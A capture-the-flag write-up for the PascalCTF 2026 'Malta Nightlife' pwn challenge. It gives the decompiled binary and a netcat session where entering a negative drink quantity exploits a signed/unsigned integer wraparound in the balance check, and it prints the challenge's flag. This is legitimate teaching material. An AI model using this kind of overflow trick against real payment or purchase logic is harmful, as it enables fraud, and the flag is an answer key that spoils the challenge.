@@ -1,0 +1,364 @@
+---
+layout: post
+title:  "Pascal 2026 Pwn Challenges"
+date:   2026-02-01 09:55:10 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /pascalctf-2026-pwn-challenges/
+---
+* TOC
+{:toc}
+
+### Malta Nightlife
+
+**Category**: Pwn
+
+**Author**: Enea Maroncelli `@ZazaMan`, Alan Davide Bovo `@AlBovo`
+
+**Description**: You’ve never seen drinks this cheap in Malta, come join the fun! 🍹                                         
+
+`nc malta.ctf.pascalctf.it 9001`
+
+I get the challenge file:
+```shell
+file malta  
+malta: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=20f78e0fea0fb7d54961ddd158dc28501b737d9f, for GNU/Linux 3.2.0, not stripped
+```
+
+I put it in ghidra. This is the main function:
+```d
+undefined8 main(void)
+
+{
+  uint local_f0;
+  int local_ec;
+  uint local_e8 [4];
+  undefined4 local_d8;
+  undefined4 local_d4;
+  undefined4 local_d0;
+  undefined4 local_cc;
+  undefined4 local_c8;
+  undefined4 local_c4;
+  char *local_b8 [4];
+  char *local_98;
+  char *local_90;
+  char *local_88;
+  char *local_80;
+  char *local_78;
+  undefined *local_70;
+  char *local_68 [4];
+  char *local_48;
+  char *local_40;
+  char *local_38;
+  char *local_30;
+  char *local_28;
+  undefined *local_20;
+  int local_10;
+  uint local_c;
+  
+  local_68[0] = "Margarita";
+  local_68[1] = "Mojito";
+  local_68[2] = "Gin lemon";
+  local_68[3] = "PascalCTF26";
+  local_48 = "Cosmopolitan";
+  local_40 = "Lavander Collins";
+  local_38 = "Japanese slipper";
+  local_30 = "Blue angel";
+  local_28 = "Martini";
+  local_20 = &DAT_0040142c;
+  local_b8[0] = "Tequila & lime";
+  local_b8[1] = "Minty & refreshing";
+  local_b8[2] = "Gin with lemon";
+  local_b8[3] = "Secret challenge ;)";
+  local_98 = "Cranberry & vodka";
+  local_90 = "Lavender twist";
+  local_88 = "Melon & citrus";
+  local_80 = "Blue & sweet";
+  local_78 = "Classic & dry";
+  local_70 = &DAT_004014c1;
+  local_e8[0] = 6;
+  local_e8[1] = 6;
+  local_e8[2] = 5;
+  local_e8[3] = 6;
+  local_d8 = 6;
+  local_d4 = 4;
+  local_d0 = 5;
+  local_cc = 6;
+  local_c8 = 3;
+  local_c4 = 1000000000;
+  local_c = 100;
+  init((EVP_PKEY_CTX *)local_b8);
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0OXMMMMMMMMMMMMMMMMMMMMMMMMMMMMXO0WMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKolkXWMMMMMMMMMMMMMMMMMMMMMMMXkloKMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:;lkXWMMMMMMMMMMMMMMMMMMWXkl;:OWMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,;lkXWMMMMMMMMMMMMMMMXkl;,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,;lkXWMMMMMMMMMMWXkl;,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,;lkXMMMMMMMWXkl;,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,;lkXWMMWXkl;,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,;lkKKkl;,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,;;;;,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,,,,,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "XKXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMWNXKX"
+      );
+  puts(
+      "XOoloxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0 kdoloOX"
+      );
+  puts(
+      "MMNkl;,;:coxk0XNWMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0kxoc:; ,;lkXWM"
+      );
+  puts(
+      "MMMWXkl;,,,,,;:codk0KNWMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMWNK0kxoc:;,,,,,; lkXWMMM"
+      );
+  puts(
+      "MMMMMWXkl;,,,,,,,,,;:codk0KNWMMMMMMMMMMMMMMMMWO:,,,,:OWMMMMMMMMMMMMMMMMWNK0kxoc:;,,,,,,,,,;lk NMMMMMM"
+      );
+  puts(
+      "MMMMMMMWXkl;,,,,,,,,,,,,,;:codk0KNWMMMMMMMMMMMNd;,,;dNMMMMMMMMMMMWNX0kxoc:;,,,,,,,,,,,,,;lkNM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,;:coxk0XNWMMMMMMKl,,lKMMMMMMWNK0kxoc:;,,,,,,,,,,,,,,,,,;lkXMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,,,,,;:coxk0XNWWkllOWWNX0kxoc:;,,,,,,,,,,,,,,,,,,,,,;lkNMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMWXd;,,,,,,,,,,,,,,,,,,,,,,,,,,;:cdkOOOOkdl:;,,,,,,,,,,,,,,,,,,,,,,,,,,;dXWMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,,,,,,,;:coxk0KOxxOK0kxoc:;,,,,,,,,,,,,,,,,,,,,,,,;lkXWMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,,,;:coxk0XNWMMMNd:;dNMMMWNK0kxoc:;,,,,,,,,,,,,,,,,,,,;lkXWMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMXkl;,,,,,,,,,,,,,,,;:coxk0KNWMMMMMMMMWO:,,:OWMMMMMMMMWNK0kxoc:;,,,,,,,,,,,,,,,;lkXWM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMXkl;,,,,,,,,,,,;:coxk0KNWMMMMMMMMMMMMMMKl,,,,lKWMMMMMMMMMMMMMWNK0kxoc:;,,,,,,,,,,,;lkX WMMMMMM"
+      );
+  puts(
+      "MMMMMXkl;,,,,,,,;:coxk0XNWMMMMMMMMMMMMMMMMMMMNd;,,,,;dNMMMMMMMMMMMMMMMMMMMWNK0kxoc:;,,,,,,,;l kXMMMMM"
+      );
+  puts(
+      "MMMXkl;,,,;:coxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMWNK0kxoc:;,,, ;lkXWMM"
+      );
+  puts(
+      "WXkl;:coxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNK0kdo c:;lkXW"
+      );
+  puts(
+      "KOxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW NK0kxkK"
+      );
+  puts(
+      "WWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMWN"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,,,,,lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,,,,,,,,,lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,,,,,,,,,,,,,,lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,;lddl;,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,;lkXWWXkl;,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,;lkNMMMMMMNkl;,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,;lkXMMMMMMMMMWXkl;,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,;lkNMMMMMMMMMMMMMMXkl;,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,;lkNMMMMMMMMMMMMMMMMMWXkl;,lKWMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;lkXMMMMMMMMMMMMMMMMMMMMMMXkl;dNMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWOdkXWMMMMMMMMMMMMMMMMMMMMMMMMWXkdOWMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts(
+      "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0KWWMMMMMMMMMMMMMMMMMMMMMMMMMMMWK0NMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMM"
+      );
+  puts("Welcome in Malta, here you\'re to buy some of the cheapest cocktails in the world!");
+  while( true ) {
+    printf(&DAT_0040296a,(ulong)local_c);
+    for (local_10 = 0; local_10 < 10; local_10 = local_10 + 1) {
+      printf(&DAT_00402983,(ulong)(local_10 + 1),local_68[local_10],(ulong)local_e8[local_10]);
+    }
+    puts("11. Exit\n");
+    printf("Select a drink: ");
+    __isoc23_scanf(&DAT_004029b8,&local_ec);
+    local_ec = local_ec + -1;
+    if (local_ec == 10) break;
+    if ((local_ec < 0) || (10 < local_ec)) {
+      puts("Invalid choice");
+    }
+    else {
+      printf("How many drinks do you want? ");
+      __isoc23_scanf(&DAT_004029b8,&local_f0);
+      if ((int)local_c < (int)(local_f0 * local_e8[local_ec])) {
+        puts("You don\'t have enough money!");
+      }
+      else {
+        local_c = local_c - local_f0 * local_e8[local_ec];
+        printf(&DAT_00402a10,(ulong)local_f0,local_68[local_ec],
+               (ulong)(local_e8[local_ec] * local_f0),local_b8[local_ec]);
+      }
+      sleep(2);
+    }
+  }
+  puts("Bye bye!");
+  return 0;
+}
+```
+
+I connect to the server and buy `-1` amount of flags to get the flag:
+```shell
+nc malta.ctf.pascalctf.it 9001  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0OXMMMMMMMMMMMMMMMMMMMMMMMMMMMMXO0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKolkXWMMMMMMMMMMMMMMMMMMMMMMMXkloKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:;lkXWMMMMMMMMMMMMMMMMMMWXkl;:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,;lkXWMMMMMMMMMMMMMMMXkl;,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,;lkXWMMMMMMMMMMWXkl;,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,;lkXMMMMMMMWXkl;,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,;lkXWMMWXkl;,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,;lkKKkl;,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,;;;;,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,,,,,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+XKXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXKX  
+XOoloxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0kdoloOX  
+MMNkl;,;:coxk0XNWMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0kxoc:;,;lkXWM  
+MMMWXkl;,,,,,;:codk0KNWMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMWNK0kxoc:;,,,,,;lkXWMMM  
+MMMMMWXkl;,,,,,,,,,;:codk0KNWMMMMMMMMMMMMMMMMWO:,,,,:OWMMMMMMMMMMMMMMMMWNK0kxoc:;,,,,,,,,,;lkNMMMMMM  
+MMMMMMMWXkl;,,,,,,,,,,,,,;:codk0KNWMMMMMMMMMMMNd;,,;dNMMMMMMMMMMMWNX0kxoc:;,,,,,,,,,,,,,;lkNMMMMMMMM  
+MMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,;:coxk0XNWMMMMMMKl,,lKMMMMMMWNK0kxoc:;,,,,,,,,,,,,,,,,,;lkXMMMMMMMMMM  
+MMMMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,,,,,;:coxk0XNWWkllOWWNX0kxoc:;,,,,,,,,,,,,,,,,,,,,,;lkNMMMMMMMMMMMM  
+MMMMMMMMMMMMMWXd;,,,,,,,,,,,,,,,,,,,,,,,,,,;:cdkOOOOkdl:;,,,,,,,,,,,,,,,,,,,,,,,,,,;dXWMMMMMMMMMMMMM  
+MMMMMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,,,,,,,;:coxk0KOxxOK0kxoc:;,,,,,,,,,,,,,,,,,,,,,,,;lkXWMMMMMMMMMMMM  
+MMMMMMMMMMWXkl;,,,,,,,,,,,,,,,,,,,;:coxk0XNWMMMNd:;dNMMMWNK0kxoc:;,,,,,,,,,,,,,,,,,,,;lkXWMMMMMMMMMM  
+MMMMMMMMMXkl;,,,,,,,,,,,,,,,;:coxk0KNWMMMMMMMMWO:,,:OWMMMMMMMMWNK0kxoc:;,,,,,,,,,,,,,,,;lkXWMMMMMMMM  
+MMMMMMMXkl;,,,,,,,,,,,;:coxk0KNWMMMMMMMMMMMMMMKl,,,,lKWMMMMMMMMMMMMMWNK0kxoc:;,,,,,,,,,,,;lkXWMMMMMM  
+MMMMMXkl;,,,,,,,;:coxk0XNWMMMMMMMMMMMMMMMMMMMNd;,,,,;dNMMMMMMMMMMMMMMMMMMMWNK0kxoc:;,,,,,,,;lkXMMMMM  
+MMMXkl;,,,;:coxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMWNK0kxoc:;,,,;lkXWMM  
+WXkl;:coxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNK0kdoc:;lkXW  
+KOxk0KNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNK0kxkK  
+WWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,,,,,lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,,,,,,,,,,,,,,,,lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,,,,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,,,,,,,,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,,,,,,,,,,,,,,,,lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,,,,,;lddl;,,,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,,,,,;lkXWWXkl;,,,,,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,;lkNMMMMMMNkl;,,,,,lKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;,,,;lkXMMMMMMMMMWXkl;,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:,,;lkNMMMMMMMMMMMMMMXkl;,,:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,;lkNMMMMMMMMMMMMMMMMMWXkl;,lKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd;lkXMMMMMMMMMMMMMMMMMMMMMMXkl;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWOdkXWMMMMMMMMMMMMMMMMMMMMMMMMWXkdOWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0KWWMMMMMMMMMMMMMMMMMMMMMMMMMMMWK0NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
+Welcome in Malta, here you're to buy some of the cheapest cocktails in the world!  
+Your balance is: 100 €  
+1. Drink: Margarita for 6 €  
+2. Drink: Mojito for 6 €  
+3. Drink: Gin lemon for 5 €  
+4. Drink: PascalCTF26 for 6 €  
+5. Drink: Cosmopolitan for 6 €  
+6. Drink: Lavander Collins for 4 €  
+7. Drink: Japanese slipper for 5 €  
+8. Drink: Blue angel for 6 €  
+9. Drink: Martini for 3 €  
+10. Drink: Flag for 1000000000 €  
+11. Exit  
+  
+Select a drink: 10  
+How many drinks do you want? -1  
+You bought -1 Flag for -1000000000 € and the barman told you its secret recipe: pascalCTF{St0p_dR1nKing_3ven_1f_it5_ch34p}  
+Your balance is: 1000000100 €  
+12. Drink: Margarita for 6 €  
+13. Drink: Mojito for 6 €  
+14. Drink: Gin lemon for 5 €  
+15. Drink: PascalCTF26 for 6 €  
+16. Drink: Cosmopolitan for 6 €  
+17. Drink: Lavander Collins for 4 €  
+18. Drink: Japanese slipper for 5 €  
+19. Drink: Blue angel for 6 €  
+20. Drink: Martini for 3 €  
+21. Drink: Flag for 1000000000 €  
+22. Exit  
+  
+Select a drink:
+```
+
+`-1` works because `%d` writes a signed `-1` into an unsigned variable. The unsigned multiplication with the large price wraps modulo 2^32 and casting the result to `int` makes it negative. The balance check treats the cost as negative and subtracting it adds money allowing you to buy the flag.
+
+`pascalCTF{St0p_dR1nKing_3ven_1f_it5_ch34p}`
+
+___
